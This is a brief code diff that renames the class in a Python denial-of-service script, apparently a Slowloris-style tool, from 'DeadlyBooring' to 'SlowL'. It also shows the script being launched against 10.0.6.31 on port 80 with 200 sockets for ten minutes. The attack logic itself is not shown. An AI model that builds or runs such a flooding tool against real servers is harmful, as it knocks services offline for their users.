@@ -1,6 +1,6 @@
 import socket, random, time, sys
 
-class DeadlyBooring():
+class SlowL():
     def __init__(self, ip, port=80, socketsCount = 200):
         self._ip = ip
         self._port = port
@@ -42,5 +42,5 @@ class DeadlyBooring():
 
 
 if __name__ == "__main__":
-    dos = DeadlyBooring("10.0.6.31", 80, socketsCount=200)
+    dos = SlowL("10.0.6.31", 80, socketsCount=200)
     dos.attack(timeout=60*10)
